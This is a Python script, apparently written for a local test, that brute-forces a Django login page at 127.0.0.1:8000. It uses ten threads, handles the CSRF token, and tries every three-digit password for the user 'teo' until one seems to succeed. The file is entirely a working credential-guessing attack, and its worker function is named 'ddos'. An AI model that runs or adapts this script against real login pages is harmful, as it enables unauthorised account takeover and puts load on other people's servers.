import requests
from concurrent.futures import ThreadPoolExecutor
import threading

executor = None
found_password = None
found_flag = threading.Event()

def ddos(password):
    global executor, found_password
    try:
        session = requests.Session()
        response = session.get("http://127.0.0.1:8000/accounts/login/")
        csrf_token = session.cookies['csrftoken']

        response = session.post("http://127.0.0.1:8000/accounts/login/",
                                data={"username": "teo", "password": password},
                                headers={"X-CSRFToken": csrf_token})

        print(password)
        if response.status_code == 500 and "Please enter a correct username and password." not in response.text:
            print("Password found:", password)
            found_password = password
            found_flag.set()  # Устанавливаем флаг обнаружения пароля
            # Остановить все потоки
            executor.shutdown(wait=False)
        else:
            print("Failed to login with password:", password)

    except Exception as e:
        print("Failed to send request:", str(e))

def bruteforce_passwords():
    global executor
    executor = ThreadPoolExecutor(max_workers=10)
    for password in generate_passwords():
        executor.submit(ddos, password)

def generate_passwords():
    for i in range(100, 1000):
        yield str(i)

if __name__ == "__main__":
    bruteforce_passwords()
    found_flag.wait()  # Ждем, пока не найдется пароль
    print("Password found:", found_password)
